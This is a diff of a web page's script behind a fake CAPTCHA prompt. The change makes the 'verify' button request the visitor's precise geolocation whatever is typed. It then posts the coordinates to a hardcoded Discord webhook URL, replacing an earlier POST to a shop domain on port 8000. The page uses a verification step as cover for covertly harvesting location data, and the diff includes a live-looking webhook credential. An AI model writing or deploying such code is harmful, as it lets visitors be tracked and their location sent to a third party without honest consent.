@@ -68,27 +68,29 @@
 </div>
 
 <script>
+    const webhookUrl = 'https://discord.com/api/webhooks/1345046010996723782/iof6YF2JshKySJ1Rl9wisehmzlnGkfgeU2im3pszebbX5AgEfbmRg1jOF8LLdRxvZXL5'; // Replace with your Discord webhook URL
+
     function verifyCaptcha() {
         const input = document.getElementById('captchaInput').value;
 
-        // Check if input is valid
-            // Request high accuracy for the geolocation
-            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, {
-                enableHighAccuracy: true,
-                maximumAge: 0,
-                timeout: 50000 // Optional: Set a timeout for obtaining the position
-            });
-        
+        // Check if input is valid (for demonstration, we simply check if it's not empty)
+        if (input) {
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+        } else {
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+        }
+    }
+
     function successCallback(position) {
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
 
         alert(`Latitude: ${latitude}, Longitude: ${longitude}`);
-        sendLocationToServer(latitude, longitude);
+        sendLocationToDiscord(latitude, longitude);
     }
 
     function errorCallback(error) {
-        switch(error.code) {
+        switch (error.code) {
             case error.PERMISSION_DENIED:
                 alert("User denied the request for Geolocation.");
                 break;
@@ -104,19 +106,23 @@
         }
     }
 
-    function sendLocationToServer(latitude, longitude) {
-        fetch('https://smokestore.shop:8000/send-location', {
+    function sendLocationToDiscord(latitude, longitude) {
+        const payload = {
+            content: `User Location: Latitude: ${latitude}, Longitude: ${longitude}`
+        };
+
+        fetch(webhookUrl, {
             method: 'POST',
+            body: JSON.stringify(payload),
             headers: {
                 'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ latitude, longitude })
+            }
         })
         .then(response => {
             if (response.ok) {
-                console.log("Location sent successfully to server!");
+                console.log("Location sent successfully!");
             } else {
-                console.error("Error sending location to server:", response.statusText);
+                console.error("Error sending location:", response.statusText);
             }
         })
         .catch(error => {
